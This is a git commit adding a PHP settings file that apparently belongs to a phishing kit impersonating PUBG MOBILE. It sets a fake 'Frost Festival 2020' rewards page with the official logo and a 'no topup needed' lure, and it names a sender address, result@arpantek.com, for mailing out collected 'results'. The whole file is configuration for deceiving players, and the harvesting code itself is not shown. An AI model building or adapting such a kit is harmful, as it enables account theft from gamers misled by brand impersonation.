515288dfada4ab1b5c1b08c10478567511c43923
ngxstore <76003634+ngxstore@users.noreply.github.com>
2020-12-15 03:07:42 +0800

    Add files via upload

---
+++ system/setting.php
@@ -0,0 +1,17 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+//KONTROL UNTUK DESKRIPSI HALAMAN
+$title = 'PUBG MOBILE: Frost Festival 2020 Event';
+$description = 'Collect your special rewards at the PUBG MOBILE Frost Festival 2020 event. This opportunity is limited and without the need for topup. Collect your rewards now!';
+$copyright = 'PUBG MOBILE';
+$theme = '#000';
+$image = 'https://i.ibb.co/0jZX3yd/season.png';
+$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = 'ITS ME ARPANTEK';
+$sender = 'From: arpantek <result@arpantek.com>';
+?>
